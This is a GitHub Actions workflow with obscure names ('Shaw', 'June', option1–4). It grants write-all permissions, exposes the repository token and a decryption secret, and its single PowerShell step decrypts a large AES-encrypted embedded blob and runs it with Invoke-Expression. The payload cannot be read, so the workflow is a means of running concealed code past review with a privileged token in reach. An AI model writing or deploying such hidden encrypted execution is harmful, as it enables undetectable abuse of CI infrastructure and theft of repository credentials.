name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
